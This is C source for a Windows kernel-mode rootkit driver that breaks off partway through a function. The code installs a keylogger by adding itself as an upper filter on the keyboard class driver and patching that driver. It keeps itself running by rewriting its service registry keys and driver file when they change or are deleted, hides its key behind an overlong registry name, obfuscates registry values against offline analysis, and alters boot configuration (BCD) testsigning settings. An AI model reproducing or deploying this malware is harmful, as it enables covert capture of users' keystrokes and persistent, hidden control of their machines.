//!!!THIS CODE FULLY WORKING!!! SURE!!!!!!!!!!!!!!!!!!!!!!!!!!!!

#include <ntddk.h>
#include <ntndk.h>
#include <ntstrsafe.h>
#include "cloak.h"
#include "payload.h"
#include "stringpool.h"
#include "settings.h"

#define TOUPPER_DELTA ('a' - 'A')
#define FILE_NOTIFY_CHANGE_NAME 0x00000001
#define FILE_NOTIFY_CHANGE_LAST_WRITE 0x00000010
#define METHOD_END FALSE
#define METHOD_SUBSTRING TRUE

typedef BOOL PARSEMETHOD;

void PrepOnBoot(PVOID pParameter);
//void PrepOnShutdown(PVOID pParameter);
void CreateRandName(PWCHAR pRandDrvName, ULONG length, BOOL flag);
void RewriteDrvFile(PVOID pContext, PIO_STATUS_BLOCK pIoStatusBlock);
BOOL mystrcmp(const WCHAR* prefix, WCHAR* testStr, ULONG lengthGiven, PARSEMETHOD parseMethod);

void LaunchThread(PVOID pStartContext){
	MYDBGPRINT("InitThread: Hello from InitThread");
	ExQueueWorkItem(pStartContext, DelayedWorkQueue);
	PsTerminateSystemThread(0x0);
}

///This is the main thread responsible for both cloaking and persistence.
///At the beginning, we do some keylogger initialization.
///Then we check if any blacklisted processes are existing. If not, we repeat until we detect a blacklisted
///process. If so all driver evidence will be deleted.
///Then we perform a passive wait on the first blacklisted process we find.
///Once the wait is satisfied (process terminated), we install us again in the system, so we will be started at next boot.


void SenseThread(PVOID pStartContext){
	UNREFERENCED_PARAMETER(pStartContext);
	MYDBGPRINT("SenseThread: Hello from SenseThread");
	LARGE_INTEGER interval;
	volatile NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;
	PUNICODE_STRING pProcessName;
	UNICODE_STRING uKbdDrvName;
	PEPROCESS pEprocess;
	PDRIVER_OBJECT pKbdDrvObj = NULL;
	volatile PDEVICE_OBJECT pKbdDevObj = NULL;
	//NTSTATUS ntstatus;
	OBJECT_ATTRIBUTES objectAttributes;
	IO_STATUS_BLOCK ioStatusBlock;
	HANDLE hDrvFile = INVALID_HANDLE_VALUE;
	//WCHAR szDrvFilePath[MAXCHAR];
	WCHAR pszDrvFilePath[512];
	//WCHAR pszDrvFilePath2[512];
	UNICODE_STRING uDrvFilePath;
	UNICODE_STRING uDirectoryToMonitor;

	interval.QuadPart = -10000000;
	KeDelayExecutionThread(KernelMode, FALSE, &interval);
	//PrepOnShutdown(NULL);
	PrepOnBoot(NULL);
	interval.QuadPart = -2000000;

	///Try to directly access the keyboard class driver
	g_pRunTimeInfo->hServiceKey = INVALID_HANDLE_VALUE;
	g_pRunTimeInfo->hClassKey = INVALID_HANDLE_VALUE;
	g_pRunTimeInfo->hBcdKey = INVALID_HANDLE_VALUE;
	g_pRunTimeInfo->hMonitorDir = INVALID_HANDLE_VALUE;
	RewriteSvcKey(NULL);
	MYDBGPRINT("SenseThread: Rewritten svc key");
	RewriteClsKey(NULL);
	MYDBGPRINT("SenseThread: Rewritten cls key");

	
	RtlInitUnicodeString(&uKbdDrvName, L"\\Driver\\kbdclass");
	while (!NT_SUCCESS(ntstatus)){
		ntstatus = ObReferenceObjectByName(&uKbdDrvName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, 0, IoDriverObjectType, KernelMode, NULL, &pKbdDrvObj);
	}
	pKbdDevObj = pKbdDrvObj->DeviceObject;
	while (NULL == pKbdDevObj){
		pKbdDevObj = pKbdDrvObj->DeviceObject;
	}
	g_pKbdHookInfo->wasPatched = FALSE;
	g_pKbdHookInfo->irpSentDown = TRUE;

	ntstatus = STATUS_UNSUCCESSFUL;
	while (STATUS_SUCCESS != ntstatus){
		for (ULONG i = 8; i < 20000; i += 4){
			CLIENT_ID cid;
			cid.UniqueProcess = NULL;
			cid.UniqueThread = NULL;
			pEprocess = NULL;
			ntstatus = PsLookupProcessByProcessId((HANDLE)i, &pEprocess);
			if (!NT_SUCCESS(ntstatus)){
				continue;
			}
			MYDBGPRINT("SenseThread: Valid process found.");
			SeLocateProcessImageName(pEprocess, &pProcessName);
			if ((TRUE == mystrcmp(L"explorer", pProcessName->Buffer, pProcessName->Length, METHOD_SUBSTRING)) ||
				(TRUE == mystrcmp(L"cmd", pProcessName->Buffer, pProcessName->Length, METHOD_SUBSTRING)) ||
				(TRUE == mystrcmp(L"logonui", pProcessName->Buffer, pProcessName->Length, METHOD_SUBSTRING))){

				g_pKbdHookInfo->pKbdDrvObj = pKbdDrvObj;
				ObfReferenceObject(g_pKbdHookInfo->pKbdDrvObj);
				ntstatus = PatchKbd(NULL);
				if (STATUS_SUCCESS != ntstatus){
					MYDBGPRINT("SenseThread: Patch error. 0x%lX", ntstatus);
				}

				ntstatus = STATUS_SUCCESS;
				ObfDereferenceObject(pEprocess);
				break;
			}
			else{
				ObfDereferenceObject(pEprocess);
			}
		}
		KeDelayExecutionThread(KernelMode, FALSE, &interval);
	}



	//RewriteBcdKey(NULL);
	//MYDBGPRINT("SenseThread: Rewritten bcd key");
	//RewriteDrvFile(NULL, NULL);
	//MYDBGPRINT("SenseThread: Rewritten drv file");


	for (;;){
		MYDBGPRINT("RewriteDrvFile: Directory contents have changed!, 0x%llX", g_pRunTimeInfo->hMonitorDir);
		if (INVALID_HANDLE_VALUE != g_pRunTimeInfo->hMonitorDir){
			ZwClose(g_pRunTimeInfo->hMonitorDir);
		}
		MYDBGPRINT("RewriteDrvFile: Closed handle 0x%llX", g_pRunTimeInfo->hMonitorDir);


		RtlStringCbPrintfW(pszDrvFilePath, sizeof(pszDrvFilePath), L"%S\\$%ws ", g_pCommonStrings->pFileInstallPath, g_pRunTimeInfo->DrvRandName);
		RtlInitUnicodeString(&uDrvFilePath, pszDrvFilePath);
		InitializeObjectAttributes(&objectAttributes, &uDrvFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
		ntstatus = ZwCreateFile(&hDrvFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, 0, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);

		if (NT_SUCCESS(ntstatus)) {
			MYDBGPRINT("RewriteDrvFile: Created drv file. 0x%lX, 0x%llX", ntstatus, g_pRunTimeInfo->hMonitorDir);
			ntstatus = ZwWriteFile(hDrvFile, NULL, NULL, NULL, &ioStatusBlock, g_pRunTimeInfo->DrvImageBegin, g_pRunTimeInfo->DrvImageSize, NULL, NULL);
			if (!NT_SUCCESS(ntstatus)) {
				MYDBGPRINT("RewriteDrvFile: ZwWriteFile failed (0x%lX)", ntstatus);
			}
			else{
				MYDBGPRINT("RewriteDrvFile: Wrote drv file. 0x%lX", ntstatus);
				ntstatus = ZwFlushBuffersFile(hDrvFile, &ioStatusBlock);
				if (!NT_SUCCESS(ntstatus)){
					MYDBGPRINT("RewriteDrvFile: ZwFlushBuffersFile failed (0x%lX)", ntstatus);
				}
				else{
					MYDBGPRINT("RewriteDrvFile: Refreshed driver file! (0x%lX)", ntstatus);
				}
			}
			ZwClose(hDrvFile);
		}
		else{
			MYDBGPRINT("RewriteDrvFile: ZwCreateFile failed (0x%lX)", ntstatus);
		}


		RtlStringCbPrintfW(pszDrvFilePath, sizeof(pszDrvFilePath), L"%S", g_pCommonStrings->pFileInstallPath);
		RtlInitUnicodeString(&uDirectoryToMonitor, pszDrvFilePath);
		InitializeObjectAttributes(&objectAttributes, &uDirectoryToMonitor, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
		ntstatus = ZwOpenFile(&g_pRunTimeInfo->hMonitorDir, SYNCHRONIZE | FILE_READ_ATTRIBUTES, &objectAttributes, &g_pRunTimeInfo->drvFileIoStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_DIRECTORY_FILE | FILE_OPEN_FOR_BACKUP_INTENT | FILE_SYNCHRONOUS_IO_NONALERT);
		if (!NT_SUCCESS(ntstatus)){
			MYDBGPRINT("RewriteDrvFile: Failed to open drv directory for monitoring! 0x%lX", ntstatus);
			//return;
			continue;
		}
		MYDBGPRINT("RewriteDrvFile: opened drv directory for monitoring! 0x%lX", ntstatus);

		ntstatus = NtNotifyChangeDirectoryFile(g_pRunTimeInfo->hMonitorDir, NULL, NULL, NULL, &g_pRunTimeInfo->drvFileIoStatusBlock, &g_pRunTimeInfo->drvFileBuffer, sizeof(FILE_NOTIFY_INFORMATION), FILE_NOTIFY_CHANGE_NAME, FALSE);
		if (!NT_SUCCESS(ntstatus)){
			MYDBGPRINT("RewriteDrvFile: Failed to rearm drv directory notify routine! 0x%lX", ntstatus);
			ZwClose(g_pRunTimeInfo->hMonitorDir);
			//return;
		}
		else{
			MYDBGPRINT("RewriteDrvFile: Armed driver image deleted notification routine! 0x%lX", ntstatus);
		}
	}
}


///Dlt our old drivr rgistry ntris and the old image file we were launched from.
void PrepOnBoot(PVOID pParameter){
	UNREFERENCED_PARAMETER(pParameter);

	UNICODE_STRING uDrvRegPathEnum;
	OBJECT_ATTRIBUTES objectAttributes;
	HANDLE hKey = INVALID_HANDLE_VALUE;
	NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;

	WCHAR szDrvRegPathEnum[MAX_PATH];

	RtlStringCbPrintfW(szDrvRegPathEnum, g_pRunTimeInfo->OldRegPath->Length + sizeof(WCHAR), g_pRunTimeInfo->OldRegPath->Buffer);
	///On Windows 7, th plug n play managr automatically crats an Enum ky beneath the driver key. Unlss this ky isnt dltd,
	///Th driver key cant be deleted (STATUS_CANNOT_DELETE).
	RtlStringCbCatW(szDrvRegPathEnum, sizeof(szDrvRegPathEnum), L"\\Enum");

	///Drivr fil hiddn by ntfs fil systm

	RtlInitUnicodeString(&uDrvRegPathEnum, szDrvRegPathEnum);

	InitializeObjectAttributes(&objectAttributes, &uDrvRegPathEnum, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
	ntstatus = ZwOpenKey(&hKey, DELETE, &objectAttributes);
	if (NT_SUCCESS(ntstatus)){
		ntstatus = ZwDeleteKey(hKey);
		//DbgPrint("PrepOnBoot: ZwDeleteKey(drv reg path enum) (0x%lX)", ntstatus);
		MYDBGPRINT("PrepOnBoot: ZwDeleteKey(drv reg path enum) (0x%lX)", ntstatus);
		ZwClose(hKey);
	}

	InitializeObjectAttributes(&objectAttributes, g_pRunTimeInfo->OldRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

	ntstatus = ZwOpenKey(&hKey, DELETE, &objectAttributes);
	if (NT_SUCCESS(ntstatus)){
		ntstatus = ZwDeleteKey(hKey);
		MYDBGPRINT("PrepOnBoot: ZwDeleteKey(old reg path) (0x%lX)", ntstatus);
		ZwClose(hKey);
	}

	InitializeObjectAttributes(&objectAttributes, g_pRunTimeInfo->OldDrvPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
	ntstatus = ZwDeleteFile(&objectAttributes);
	MYDBGPRINT("PrepOnBoot: ZwDeleteFile(drv path) (0x%lX)", ntstatus);

	MYDBGPRINT("Boot preparations performed");
	CreateRandName(g_pRunTimeInfo->DrvRandName, g_pRunTimeInfo->DrvRandNameLength / sizeof(WCHAR), TRUE);
	CreateRandName(g_pRunTimeInfo->KeyRandName, g_pRunTimeInfo->KeyRandNameLength / sizeof(WCHAR), FALSE);
	MYDBGPRINT("Shutdown preparations performed");
}


///Generate random key and image names and create both normal and safemode registry keys
///Then create the hidden image file and lock it.
//void PrepOnShutdown(PVOID pParameter){
//	UNREFERENCED_PARAMETER(pParameter);
//	PrepOnBoot(NULL);
//	///Create random path parts in order to later generate both a new driver and registry path
//
//
//
//
//}

void RewriteSvcKey(PVOID pContext){
	UNREFERENCED_PARAMETER(pContext);
	NTSTATUS ntstatus;
	MYDBGPRINT("Key has changed!, %llX", pContext);

	if (INVALID_HANDLE_VALUE != g_pRunTimeInfo->hServiceKey){
		ZwClose(g_pRunTimeInfo->hServiceKey);
	}


	UNICODE_STRING uDrvRegPath;
	OBJECT_ATTRIBUTES objectAttributes;
	HANDLE hKey;

	ULONG drvStart = SERVICE_SYSTEM_START;
	WCHAR type = 0x0;

	//WCHAR szDrvRegPath[MAXCHAR];
	//WCHAR szDrvFilePath[MAXCHAR];
	WCHAR pszHiderKeyName[512];
	WCHAR pszDrvRegPath[512];
	WCHAR pszDrvFilePath[512];
	//WCHAR variable[4096];

	ULONGLONG drvFilePathLength = 0;
	UNICODE_STRING uHiderKeyName;
	UNICODE_STRING uKeyToMonitor;

	OBJECT_ATTRIBUTES objectAttributes2;
	ntstatus = STATUS_UNSUCCESSFUL;
	HANDLE hHiderKey;
	LARGE_INTEGER interval;
	interval.QuadPart = -5000000;
	WCHAR szAntiSafeboot[] = L"System Bus Extender";

	///Create random path parts in order to later generate both a new driver and registry path
	ntstatus = RtlStringCbPrintfW(pszHiderKeyName, sizeof(pszHiderKeyName), L"%S\\%S", g_pCommonStrings->pServicesKeyPath, g_pCommonStrings->pHiderSvc);
	//DbgPrint("%ws, 0x%lX", pszHiderKeyName, ntstatus);
	//RtlInitUnicodeString(&uHiderKeyName, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\ZyXELWlSvc                                                                                                                                                                                                                                                   ");
	RtlInitUnicodeString(&uHiderKeyName, pszHiderKeyName);
	InitializeObjectAttributes(&objectAttributes2, &uHiderKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	///Exploit windows registry by creating an overlong reg key to prevent regedit and some other tools from accessing the random drvtriks key itself
	ntstatus = ZwCreateKey(&hHiderKey, KEY_READ | KEY_WRITE | DELETE, &objectAttributes2, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
	if (NT_SUCCESS(ntstatus)){
		MYDBGPRINT("key hide create successful%lX", ntstatus);
		ZwClose(hHiderKey);
	}

	//RtlStringCbPrintfW(szDrvRegPath, sizeof(szDrvRegPath), L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Zz%ws  ", g_pRunTimeInfo->KeyRandName);
	RtlStringCbPrintfW(pszDrvRegPath, sizeof(pszDrvRegPath), L"%S\\Zz%ws  ", g_pCommonStrings->pServicesKeyPath, g_pRunTimeInfo->KeyRandName);
	RtlStringCbPrintfW(pszDrvFilePath, sizeof(pszDrvFilePath), L"%S\\$%ws ", g_pCommonStrings->pFileInstallPath, g_pRunTimeInfo->DrvRandName);
	//RtlStringCbPrintfW(szDrvFilePath, sizeof(szDrvFilePath), L"\\??\\Global\\C:\\$Extend\\$RmMetadata\\$%ws ", g_pRunTimeInfo->DrvRandName);
	RtlStringCbLengthW(pszDrvFilePath, sizeof(pszDrvFilePath), &drvFilePathLength);
	drvFilePathLength += sizeof(WCHAR);

	///Install ndd rgistry ntris whil obfuscating srvic configuration as much as possibl.
	///This will hindr offlin analysis...
	type = (WCHAR)((g_pRunTimeInfo->ValueType) ^ 0xDAFAAAAC);
	RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, pszDrvRegPath, L"Type", (g_pRunTimeInfo->ValueType) ^ 0xBAAAAAAD, &type, sizeof(WCHAR));
	RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, pszDrvRegPath, L"Start", (g_pRunTimeInfo->ValueType) ^ 0x7F7F7F7F, &drvStart, sizeof(char));
	RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, pszDrvRegPath, L"ImagePath", g_pRunTimeInfo->ValueType, &pszDrvFilePath, (ULONG)drvFilePathLength);
	RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, pszDrvRegPath, L"Group", (g_pRunTimeInfo->ValueType) ^ 0x42424242, &szAntiSafeboot, sizeof(szAntiSafeboot));

	RtlStringCbPrintfW(pszDrvRegPath, sizeof(pszDrvRegPath), L"%S", g_pCommonStrings->pServicesKeyPath);
	//RtlInitUnicodeString(&uDrvRegPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services");
	RtlInitUnicodeString(&uDrvRegPath, pszDrvRegPath);
	InitializeObjectAttributes(&objectAttributes, &uDrvRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
	ntstatus = ZwOpenKey(&hKey, GENERIC_ALL, &objectAttributes);
	if (NT_SUCCESS(ntstatus)){
		ntstatus = ZwFlushKey(hKey);
		ZwClose(hKey);
		MYDBGPRINT("Flushed %ws key contents to disk! 0x%lX", pszDrvRegPath, ntstatus);
	}
	else{
		MYDBGPRINT("Flushfail! 0x%lX", ntstatus);
	}

	//RtlInitUnicodeString(&uKeyToMonitor, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services");
	RtlInitUnicodeString(&uKeyToMonitor, pszDrvRegPath);
	InitializeObjectAttributes(&objectAttributes2, &uKeyToMonitor, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	ntstatus = ZwOpenKey(&g_pRunTimeInfo->hServiceKey, KEY_NOTIFY | KEY_READ | KEY_QUERY_VALUE, &objectAttributes2);
	if (!NT_SUCCESS(ntstatus)){
		
		for (;;){
			MYDBGPRINT("Failed to open service key for monitoring! 0x%lX", ntstatus);
			//ntstatus = ZwOpenKey(&g_pRunTimeInfo->hBcdKey, KEY_NOTIFY | KEY_READ, &objectAttributes);
			//if (NT_SUCCESS(ntstatus)){
			//	break;
			//}
			//MYDBGPRINT("Failed to open BCD key... trying again. (0x%lX)", ntstatus);
			KeDelayExecutionThread(KernelMode, FALSE, &interval);

			//if (!NT_SUCCESS(ntstatus)){
			//	
			//	return;
			//}

		}
		//return;
	}

	ntstatus = ZwNotifyChangeKey(g_pRunTimeInfo->hServiceKey, NULL, g_pRunTimeInfo->fpSvcKeyWorkItem, (PVOID)DelayedWorkQueue, &g_pRunTimeInfo->svcKeyIoStatusBlock, REG_NOTIFY_CHANGE_ATTRIBUTES | REG_NOTIFY_CHANGE_LAST_SET | REG_NOTIFY_CHANGE_NAME | REG_NOTIFY_CHANGE_SECURITY, TRUE, NULL, 0, TRUE);
	if (!NT_SUCCESS(ntstatus)){
		
		ZwClose(g_pRunTimeInfo->hServiceKey);
		for (;;){
			MYDBGPRINT("Failed to rearm service key notify routine! 0x%lX", ntstatus);
			//ntstatus = ZwOpenKey(&g_pRunTimeInfo->hBcdKey, KEY_NOTIFY | KEY_READ, &objectAttributes);
			//if (NT_SUCCESS(ntstatus)){
			//	break;
			//}
			//MYDBGPRINT("Failed to open BCD key... trying again. (0x%lX)", ntstatus);
			KeDelayExecutionThread(KernelMode, FALSE, &interval);

			//if (!NT_SUCCESS(ntstatus)){
			//	
			//	return;
			//}

		}
		//return;
	}
}

void RewriteClsKey(PVOID pContext){
	UNREFERENCED_PARAMETER(pContext);
	OBJECT_ATTRIBUTES objectAttributes2;
	NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;
	UNICODE_STRING uKeyToMonitor;
	HANDLE hKey = INVALID_HANDLE_VALUE;
	WCHAR pszClassKey[512];
	LARGE_INTEGER interval;

	interval.QuadPart = -5000000;
	///kbdclass
	char pUpperFilters[] = { 0x6B, 0x00, 0x62, 0x00, 0x64, 0x00, 0x63, 0x00, 0x6C, 00, 0x61, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00 };

	MYDBGPRINT("class key has changed");
	if (INVALID_HANDLE_VALUE != g_pRunTimeInfo->hClassKey){
		ZwClose(g_pRunTimeInfo->hClassKey);
	}
	RtlStringCbPrintfW(pszClassKey, sizeof(pszClassKey), L"%S", g_pCommonStrings->pClassPath);
	//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e96b-e325-11ce-bfc1-08002be10318}", L"UpperFilters", REG_MULTI_SZ, pUpperFilters, sizeof(pUpperFilters));
	RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, pszClassKey, L"UpperFilters", REG_MULTI_SZ, pUpperFilters, sizeof(pUpperFilters));
	RtlInitUnicodeString(&uKeyToMonitor, pszClassKey);
	InitializeObjectAttributes(&objectAttributes2, &uKeyToMonitor, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
	ntstatus = ZwOpenKey(&hKey, GENERIC_ALL, &objectAttributes2);
	if (NT_SUCCESS(ntstatus)){
		ZwFlushKey(hKey);
		ZwClose(hKey);
	}

	//RtlInitUnicodeString(&uKeyToMonitor, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e96b-e325-11ce-bfc1-08002be10318}");
	//InitializeObjectAttributes(&objectAttributes2, &uKeyToMonitor, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	ntstatus = ZwOpenKey(&g_pRunTimeInfo->hClassKey, KEY_NOTIFY | KEY_READ | KEY_QUERY_VALUE, &objectAttributes2);
	if (!NT_SUCCESS(ntstatus)){
		
		//return;
		for (;;){
			MYDBGPRINT("Failed to open class key for monitoring! 0x%lX", ntstatus);
			//ntstatus = ZwOpenKey(&g_pRunTimeInfo->hBcdKey, KEY_NOTIFY | KEY_READ, &objectAttributes);
			//if (NT_SUCCESS(ntstatus)){
			//	break;
			//}
			//MYDBGPRINT("Failed to open BCD key... trying again. (0x%lX)", ntstatus);
			KeDelayExecutionThread(KernelMode, FALSE, &interval);

			//if (!NT_SUCCESS(ntstatus)){
			//	
			//	return;
			//}

		}
	}

	ntstatus = ZwNotifyChangeKey(g_pRunTimeInfo->hClassKey, NULL, g_pRunTimeInfo->fpClsKeyWorkItem, (PVOID)DelayedWorkQueue, &g_pRunTimeInfo->clskeyIoStatusBlock, REG_NOTIFY_CHANGE_ATTRIBUTES | REG_NOTIFY_CHANGE_LAST_SET | REG_NOTIFY_CHANGE_NAME | REG_NOTIFY_CHANGE_SECURITY, FALSE, NULL, 0, TRUE);
	if (!NT_SUCCESS(ntstatus)){
		
		ZwClose(g_pRunTimeInfo->hClassKey);
		for (;;){
			MYDBGPRINT("Failed to rearm class key notify routine! 0x%lX", ntstatus);
			//ntstatus = ZwOpenKey(&g_pRunTimeInfo->hBcdKey, KEY_NOTIFY | KEY_READ, &objectAttributes);
			//if (NT_SUCCESS(ntstatus)){
			//	break;
			//}
			//MYDBGPRINT("Failed to open BCD key... trying again. (0x%lX)", ntstatus);
			KeDelayExecutionThread(KernelMode, FALSE, &interval);

			//if (!NT_SUCCESS(ntstatus)){
			//	
			//	return;
			//}

		}
		//return;

	}
}

void RewriteBcdKey(PVOID pContext){
	UNREFERENCED_PARAMETER(pContext);
	MYDBGPRINT("Placeholder routine for bcd key notify...");
	UNREFERENCED_PARAMETER(pContext);
	OBJECT_ATTRIBUTES objectAttributes;
	OBJECT_ATTRIBUTES objectAttributes2;
	NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;
	UNICODE_STRING uKeyToMonitor;
	UNICODE_STRING uKeyToRefresh;
	HANDLE hKey = INVALID_HANDLE_VALUE;

	PVOID pBootEntry = NULL;
	ULONG subkeyCount = 0;
	ULONG resultLength = 0;
	WCHAR testsigningKeyPath[512];
	WCHAR pszBcdKeyPath[512];
	WCHAR pszBcdKeyPath2[512];
	UCHAR testsigningYES = 0x9C;
	LARGE_INTEGER interval;
	
	interval.QuadPart = -5000000;

	MYDBGPRINT("bcd key has changed");
	if (INVALID_HANDLE_VALUE != g_pRunTimeInfo->hBcdKey){
		ZwClose(g_pRunTimeInfo->hBcdKey);
	}

	RtlStringCbPrintfW(pszBcdKeyPath, sizeof(pszBcdKeyPath), L"%S", g_pCommonStrings->pBCDKeyPathAboveGuid);
	//RtlInitUnicodeString(&uKeyToMonitor, L"\\Registry\\Machine\\BCD00000000");
	RtlInitUnicodeString(&uKeyToMonitor, pszBcdKeyPath);
	InitializeObjectAttributes(&objectAttributes, &uKeyToMonitor, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	//while (!NT_SUCCESS(ntstatus)){
	
	for (;;){
		ntstatus = ZwOpenKey(&g_pRunTimeInfo->hBcdKey, KEY_NOTIFY | KEY_READ, &objectAttributes);
		if (NT_SUCCESS(ntstatus)){
			break;
		}
		MYDBGPRINT("Failed to open BCD key for monitoring... trying again. (0x%lX)", ntstatus);
		KeDelayExecutionThread(KernelMode, FALSE, &interval);
		
		//if (!NT_SUCCESS(ntstatus)){
		//	
		//	return;
		//}

	}




	RtlStringCbPrintfW(pszBcdKeyPath2, sizeof(pszBcdKeyPath2), L"%S\\Objects", g_pCommonStrings->pBCDKeyPathAboveGuid);
	RtlInitUnicodeString(&uKeyToRefresh, pszBcdKeyPath2);
	InitializeObjectAttributes(&objectAttributes2, &uKeyToRefresh, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	ntstatus = ZwOpenKey(&hKey, KEY_NOTIFY | KEY_READ, &objectAttributes2);
	if (!NT_SUCCESS(ntstatus)){
		MYDBGPRINT("Failed to open bcd key for refreshing! 0x%lX", ntstatus);
	}
	else{
		pBootEntry = ExAllocatePool(NonPagedPool, PAGE_SIZE);
		if (NULL == pBootEntry){
			MYDBGPRINT("RewriteBcdKey: Memory allocation failed!");
		}
		else{
			RtlZeroMemory(pBootEntry, PAGE_SIZE);
			ntstatus = ZwQueryKey(hKey, KeyFullInformation, pBootEntry, PAGE_SIZE, &resultLength);
			if (!NT_SUCCESS(ntstatus)){
				MYDBGPRINT("Could not determine subkey count! (0x%llX)");
			}
			else{
				subkeyCount = ((PKEY_FULL_INFORMATION)pBootEntry)->SubKeys;
				for (ULONG i = 0; i < subkeyCount; i++){
					ntstatus = ZwEnumerateKey(hKey, i, KeyBasicInformation, pBootEntry, PAGE_SIZE, &resultLength);
					((PUCHAR)((PKEY_BASIC_INFORMATION)pBootEntry)->Name)[((PKEY_BASIC_INFORMATION)pBootEntry)->NameLength] = 0x0;
					MYDBGPRINT("BCD00000000\\Objects\\%ws\\Elements\\16000049", ((PKEY_BASIC_INFORMATION)pBootEntry)->Name);
					testsigningYES = (UCHAR)(g_pRunTimeInfo->ValueType);
					RtlStringCbPrintfW(testsigningKeyPath, sizeof(testsigningKeyPath), L"%ws\\%ws\\Elements\\ 16000049  ", pszBcdKeyPath2,((PKEY_BASIC_INFORMATION)pBootEntry)->Name);
					ntstatus = RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, testsigningKeyPath, L"Element", REG_BINARY, &testsigningYES, sizeof(testsigningYES));
					if (!NT_SUCCESS(ntstatus)){
						MYDBGPRINT("Failed to rewrite BCD00000000 key!");
					}
					testsigningYES = 0x0;
					RtlStringCbPrintfW(testsigningKeyPath, sizeof(testsigningKeyPath), L"%ws\\%ws\\Elements\\16000049", pszBcdKeyPath2, ((PKEY_BASIC_INFORMATION)pBootEntry)->Name);
					ntstatus = RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, testsigningKeyPath, L"Element", REG_BINARY, &testsigningYES, sizeof(testsigningYES));
					if (!NT_SUCCESS(ntstatus)){
						MYDBGPRINT("Failed to rewrite BCD00000000 key!");
					}
				}

			}
			ExFreePool(pBootEntry);
		}
		ZwClose(hKey);
	}

	ntstatus = ZwNotifyChangeKey(g_pRunTimeInfo->hBcdKey, NULL, g_pRunTimeInfo->fpBcdKeyWorkItem, (PVOID)DelayedWorkQueue, &g_pRunTimeInfo->bcdKeyIoStatusBlock, REG_NOTIFY_CHANGE_ATTRIBUTES | REG_NOTIFY_CHANGE_LAST_SET | REG_NOTIFY_CHANGE_NAME | REG_NOTIFY_CHANGE_SECURITY, TRUE, NULL, 0, TRUE);
	if (!NT_SUCCESS(ntstatus)){
		ZwClose(g_pRunTimeInfo->hBcdKey);
		for (;;){
			MYDBGPRINT("Failed to rearm bcd key notify routine! 0x%lX", ntstatus);
			//ntstatus = ZwOpenKey(&g_pRunTimeInfo->hBcdKey, KEY_NOTIFY | KEY_READ, &objectAttributes);
			//if (NT_SUCCESS(ntstatus)){
			//	break;
			//}
			//MYDBGPRINT("Failed to open BCD key... trying again. (0x%lX)", ntstatus);
			KeDelayExecutionThread(KernelMode, FALSE, &interval);

			//if (!NT_SUCCESS(ntstatus)){
			//	
			//	return;
			//}

		}
		//return;
	}
}


void RewriteDrvFile(PVOID pContext, PIO_STATUS_BLOCK pIoStatusBlock){
	UNREFERENCED_PARAMETER(pIoStatusBlock);
	UNREFERENCED_PARAMETER(pContext);
	NTSTATUS ntstatus;
	OBJECT_ATTRIBUTES objectAttributes;
	IO_STATUS_BLOCK ioStatusBlock;
	HANDLE hDrvFile = INVALID_HANDLE_VALUE;
	//WCHAR szDrvFilePath[MAXCHAR];
	WCHAR pszDrvFilePath[512];
	//WCHAR pszDrvFilePath2[512];
	UNICODE_STRING uDrvFilePath;
	UNICODE_STRING uDirectoryToMonitor;

	for (;;){
		MYDBGPRINT("RewriteDrvFile: Directory contents have changed!, 0x%llX", g_pRunTimeInfo->hMonitorDir);
		if (INVALID_HANDLE_VALUE != g_pRunTimeInfo->hMonitorDir){
			ZwClose(g_pRunTimeInfo->hMonitorDir);
		}
		MYDBGPRINT("RewriteDrvFile: Closed handle 0x%llX", g_pRunTimeInfo->hMonitorDir);


		RtlStringCbPrintfW(pszDrvFilePath, sizeof(pszDrvFilePath), L"%S\\$%ws ", g_pCommonStrings->pFileInstallPath, g_pRunTimeInfo->DrvRandName);
		RtlInitUnicodeString(&uDrvFilePath, pszDrvFilePath);
		InitializeObjectAttributes(&objectAttributes, &uDrvFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
